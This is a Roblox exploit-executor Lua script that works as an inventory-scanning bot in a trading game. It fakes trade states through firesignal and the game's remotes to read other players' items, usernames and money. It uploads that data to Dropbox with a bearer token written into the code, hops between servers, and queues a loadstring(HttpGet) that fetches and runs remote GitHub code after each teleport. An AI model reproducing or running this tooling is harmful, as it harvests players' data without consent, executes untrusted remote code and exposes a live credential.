local DROPBOX_TOKEN = "sl.u.AGJv_XvRHVnjDCnp1u1EZmsC3nPLw0ZIjGOyPzsX-HRAXrw6H4FfHX3SVoMy25jyOALgWM50L3WgV_aYztWODhGPJcuSSW4_JMFVObXKY7H5Y6GQRrQDzX9i0hMkU3EMFAmFjL1Rj6tMuVZFqQCd310I8NiFeFBV1NIAtmJPi4CdQqPdeVyjLXrpJWypVExrTKt-VN7ynvDFAiTIYbk5WBSBCmY_0m0Bsa-HsUWLvTalyP0NFrJSa6X4GwoQjwg1IUDNVdQQ-_MQu3pnZUWqfRq5M6DTs5yi9311O7SUz0RJkp8J4XSv2PDK73jV79VoNe-wBYz8SGgXbIPiZtSs29qQEwUXEYRz6qroddWciM6rpkPYqxbcKvT8O99UxcaHS-1JCs1Io0CCFrm9n63dqurkg_7BMInkFEzhcreURmo9Vvje_6JyQbOw39N1Yx0hINvwDMJax_pvhq0u0J4NA3mHyuln13ArZd84Z3EmEGM-pEfPuubBIRL0XpeJ5bpFnEau-rEW-jfFfwEOqmz4y9aOHpuOmeIQPrchqq8RgPZbRmh4maSpSGsAKFdmc-qI-HJJBfFSLCgigY7_ZpPOaRRSxY8EuF0wUBugCL7vrOfYjt0PkAdccsCsTFnUle4DUVTG_9qAARDmQUjMnm_IYckTZpPSg_ntPAr9vy6nHEwihdIkQ3Aun-d6goTbnFYEvo1Z5KU9sHOa91ZtI5W5TxUoBBpxLrSTFZUZVUvmsq9tAFdC9ie3qm-H9va-UXi7Ci37qx7-VRvBjDEoldoeBFw8dznCS56_lgWPBXfnbUqzq7RsxTBDP_8jIFaEUGytvtZuhNVQ-fcqPvXYxoIc7vhlDvu9i3RKDndy6Fl6KUMFw5OjKvbEZ8kS5qWclC7OaeoBvYSTgA4m-blD0nBsvJsCwRXBlbsRxoLwS3P4xk1E_tivZTdKtNZHE8ElqKQJuDFj76A4TXyeqfTv1O12tqYQU2atmosXlGawekTvVgX8dgKS9W0s8f7wQEWfvkzNpHi23qwlp3x4qotYlVb0JIQZ8DbJaL8Ri7oyC5cvSlWVYuxNpAXZo5ir-78i145L4zIPUuXNgch2cOEFl4mZO7K6v5vSEO4kZWh7EMZImkQ8aI7xcxxY76oz89N2myrWxB2-T-sEwS84zsf28NDRi9LhiEGx86jizcTj18TYlEk8fUiqS4w2vl0LlLtPQgE5Yvb4q6DbcY03U7xD86ZxZ8mFKAqs7Pr0u4DUs6F-x5qBLUwDnJ_dyCZavFUIoKdggff1iQ6qQpB0LsOUDw4Z_AVCTdzjuRRFTgD0bj8nu6xKeVBDLOPbWp9PexIfcVSWAVAgTfzWwmxdXHV0HR2iOAe_kjnXiboJSIkI1mIxRQC9qiR7v0_VtLDln60somw6U-U5keAabKTjLVBslU0z_DnnZjKxjg3XHIBBz1fDHN5d5n6LwhQpAAb6VKaRd5o7tUw"

local ReplicatedStorageService = game:GetService("ReplicatedStorage")
local args = {
	"Spying On Live Trades"
}
game:GetService("ReplicatedStorage"):WaitForChild("SetTradeDesireRemote"):FireServer(unpack(args))


local TextChatService = game:GetService("TextChatService")
local HttpService = game:GetService("HttpService")

local PlayersService = game:GetService("Players")

local http_request = http_request or request or HttpPost or syn.request

local LocalPlayer = PlayersService.LocalPlayer

LocalPlayer.ActiveTrade.Value = true

task.spawn(function()
	task.wait(1)

	pcall(function()
		firesignal(LocalPlayer.PlayerGui.AppUI.Trade.Offerings.Player1Offering.Cards[1].Activated)
	end)

end)

local function fetchUserInventory(userId)
	local path = "/Inventories/" .. userId .. ".json"

	local success, result = pcall(function()
		local res = http_request({
			Url = "https://content.dropboxapi.com/2/files/download",
			Method = "POST",
			Headers = {
				["Authorization"] = "Bearer " .. DROPBOX_TOKEN,
				["Dropbox-API-Arg"] = HttpService:JSONEncode({ path = path })
			}
		})

		if res.StatusCode == 200 then
			return HttpService:JSONDecode(res.Body)
		end
	end)

	return (success and type(result) == "table") and result or {}
end


local function uploadUserInventory(userId, data)
	local path = "/Inventories/" .. userId .. ".json"

	http_request({
		Url = "https://content.dropboxapi.com/2/files/upload",
		Method = "POST",
		Headers = {
			["Authorization"] = "Bearer " .. DROPBOX_TOKEN,
			["Dropbox-API-Arg"] = HttpService:JSONEncode({
				path = path,
				mode = "overwrite",
				autorename = false,
				mute = true
			}),
			["Content-Type"] = "application/octet-stream"
		},
		Body = HttpService:JSONEncode(data)
	})
end

local function savePlayerInventory(Player, inventory)
	if not inventory then return end

	local existingData = fetchUserInventory(Player.UserId)

	local formattedInventory = {}
	for _, v in ipairs(inventory) do
		table.insert(formattedInventory, {
			name = v[1],
			category = v[2]
		})
	end

	table.insert(existingData, {
		timestamp = os.time(),
		inventory = formattedInventory
	})

	uploadUserInventory(Player.UserId, existingData)
end


task.spawn(function()
	local PlayersService = game:GetService("Players")
	local HttpService = game:GetService("HttpService")

	-- Fetch existing JSON from Dropbox
	local function fetchDropboxJson(path)
		local success, result = pcall(function()
			local res = http_request({
				Url = "https://content.dropboxapi.com/2/files/download",
				Method = "POST",
				Headers = {
					["Authorization"] = "Bearer " .. DROPBOX_TOKEN,
					["Dropbox-API-Arg"] = HttpService:JSONEncode({ path = path })
				}
			})
			if res.StatusCode == 200 then
				return HttpService:JSONDecode(res.Body)
			end
		end)
		return success and result or {}
	end

	-- Upload JSON to Dropbox
	local function uploadDropboxJson(path, data)
		local payload = HttpService:JSONEncode(data)
		local success, result = pcall(function()
			local res = http_request({
				Url = "https://content.dropboxapi.com/2/files/upload",
				Method = "POST",
				Headers = {
					["Authorization"] = "Bearer " .. DROPBOX_TOKEN,
					["Dropbox-API-Arg"] = HttpService:JSONEncode({
						path = path,
						mode = "overwrite",
						autorename = false,
						mute = false
					}),
					["Content-Type"] = "application/octet-stream"
				},
				Body = payload
			})
			return res.StatusCode == 200
		end)
		return success and result
	end

	-- Save all players individually
	local function saveAllPlayers()
		for _, player in next, PlayersService:GetPlayers() do
			local path = "/players/" .. player.UserId .. ".json"
			local allData = fetchDropboxJson(path)
			local money = 0

			if player:FindFirstChild("leaderstats") and player.leaderstats:FindFirstChild("Money") then
				money = player.leaderstats.Money.Value
			end

			local entry = {
				userId = player.UserId,
				username = player.Name,
				displayName = player.DisplayName,
				money = money,
				timestamp = os.time()
			}

			table.insert(allData, entry)
			uploadDropboxJson(path, allData)
		end
	end

	-- Call it whenever you want to save
	saveAllPlayers()
end)

local inventoryRequestQueue = {}
local isProcessingInventoryRequest = false

local function processNextInventoryRequest()
	if #inventoryRequestQueue == 0 then
		isProcessingInventoryRequest = false
		return
	end

	isProcessingInventoryRequest = true

	local nextRequest = table.remove(inventoryRequestQueue, 1)
	local player = nextRequest.Player
	local bindable = nextRequest.Bindable

	local inventory = GetPlayerInventory(player)

	bindable:Fire(inventory)

	task.spawn(processNextInventoryRequest)
end

function RequestPlayerInventory(player)
	local bindable = Instance.new("BindableEvent")

	table.insert(inventoryRequestQueue, {
		Player = player,
		Bindable = bindable
	})

	if not isProcessingInventoryRequest then
		task.spawn(processNextInventoryRequest)
	end

	-- Wait for the inventory to be returned
	return bindable.Event:Wait()
end

local CategoryIndexMap = {
	12,
	1,
	2,
	3,
	4,
	5,
	6,
	7,
	8,
	9,
	10,
	11
}

function GetPlayerInventory(Player)
	if Player  then
		local Inventory = {}

		ReplicatedStorageService:WaitForChild("TradeInventoryUpdatePlayer"):FireServer(Player)

		task.wait(0.6)

		for i = 1, 12 do
			firesignal(LocalPlayer.PlayerGui.AppUI.Trade.ItemTypesContainer.ScrollingGrid[i].Activated)
			
			task.wait(0.2)
			
			--local Category = LocalPlayer.PlayerGui.AppUI.Trade.ItemTypesContainer.ScrollingGrid[i].Title.Text.Text
			local Category = "Nil"
		
			for i2, v2 in next, LocalPlayer.PlayerGui.AppUI.Trade.ItemsContainer.ScrollingGrid:GetChildren() do 	
				if v2:WaitForChild("Title").Text.Text then
					table.insert(Inventory, {v2:WaitForChild("Title").Text.Text, Category})
				end
			end
		end

		return Inventory
	end

	return nil
end

task.spawn(function()
	task.wait(1)

	local Players = PlayersService:GetPlayers()
	local Taken = {}

	for i = 1, #Players do
		local Player
		
		repeat
			task.wait()
			Player = Players[math.random(1, #Players)]
		until not Taken[Player]

		Taken[Player] = true

		local inventory = RequestPlayerInventory(Player)
		savePlayerInventory(Player, inventory)
	end
end)

local ReplicatedStorageService = game:GetService("ReplicatedStorage")
local TeleportService = game:GetService("TeleportService")
local PlayersService = game:GetService("Players")
local HttpService = game:GetService("HttpService")

local LocalPlayer = PlayersService.LocalPlayer

local Messages = {
	"YOU KNOW THE DRILL, SCANNING INVENTORIES",
	"ANOTHER INVENTORY SCAN, OBVIOUSLY",
	"SAW THE UPDATE, GUESS I'LL SCAN",
	"UGH, ANOTHER DAY, ANOTHER SCAN",
	"I HATE BEING A SCAN BOT",
}

ReplicatedStorageService:WaitForChild("SetTradeDesireRemote"):FireServer(Messages[math.random(1, #Messages)])

local Cooldown = false

ReplicatedStorageService.OtherTradeServerData.OnClientEvent:Connect(function(Servers)
	if Cooldown then return end
	Cooldown = true

	local TotalServers = 0
	local TotalTraders = 0
	local AllServerIDs = {}

	-- Count servers and traders
	for i, v in next, Servers do
		local ServerID = v.otherServerId
		local IDs = v.userIds

		TotalServers = TotalServers + 1
		TotalTraders = TotalTraders + #IDs

		table.insert(AllServerIDs, ServerID)
	end

	local timestamp = os.time()

	-- Fetch live total players
	local universeId = "245662005"
	local totalPlayers = 0
	local success, result = pcall(function()
		local res = http_request({
			Url = "https://games.roblox.com/v1/games?universeIds=" .. universeId,
			Method = "GET"
		})
		local data = HttpService:JSONDecode(res.Body)
		if data.data and #data.data > 0 then
			totalPlayers = data.data[1].playing or 0
		end
	end)
	if not success then
		warn("Failed to fetch live player count:", result)
	end

	-- Calculate trader percentage
	local traderCount = TotalTraders or 0
	local traderPercent = 0
	if totalPlayers > 0 then
		traderPercent = math.floor((traderCount / totalPlayers) * 100 * 10 + 0.5) / 10
	end

	-- Create new scan entry
	local newScan = {
		total_traders = traderCount,
		total_servers = TotalServers or 0,
		lowest_player_server = 1,
		highest_player_server = 2,
		total_players = totalPlayers,
		trader_percent = traderPercent,
		time = timestamp
	}

	-- Fetch existing history from Dropbox
	local history = {}
	local success, result = pcall(function()
		local res = http_request({
			Url = "https://content.dropboxapi.com/2/files/download",
			Method = "POST",
			Headers = {
				["Authorization"] = "Bearer " .. DROPBOX_TOKEN,
				["Dropbox-API-Arg"] = HttpService:JSONEncode({ path = "/scans/history.json" })
			}
		})
		if res.StatusCode == 200 then
			history = HttpService:JSONDecode(res.Body)
		end
	end)
	if not success then
		warn("Could not fetch history, starting new file")
	end

	-- Append new scan and trim history
	table.insert(history, newScan)
	while #history > 20000 do
		table.remove(history, 1)
	end

	-- Upload updated history
	local payloadJson = HttpService:JSONEncode(history)
	local dropboxHeaders = {
		["Authorization"] = "Bearer " .. DROPBOX_TOKEN,
		["Dropbox-API-Arg"] = HttpService:JSONEncode({
			path = "/scans/history.json",
			mode = "overwrite",
			autorename = false,
			mute = false
		}),
		["Content-Type"] = "application/octet-stream"
	}

	local uploadSuccess, uploadResult = pcall(function()
		local res = http_request({
			Url = "https://content.dropboxapi.com/2/files/upload",
			Method = "POST",
			Headers = dropboxHeaders,
			Body = payloadJson
		})
		if res.StatusCode ~= 200 then
			warn("Dropbox upload failed:", res.StatusCode, res.Body)
		end
	end)
	if not uploadSuccess then
		warn("Failed to upload history:", uploadResult)
	end

	Cooldown = false

	queue_on_teleport("loadstring(game:HttpGet('https://raw.githubusercontent.com/testdfsdfd/bwds/refs/heads/main/test7'))()")

	repeat
		task.wait(1)
		TeleportService:TeleportToPlaceInstance(
			game.PlaceId,
			AllServerIDs[math.random(1, #AllServerIDs)],
			LocalPlayer
		)
	until not game
end)
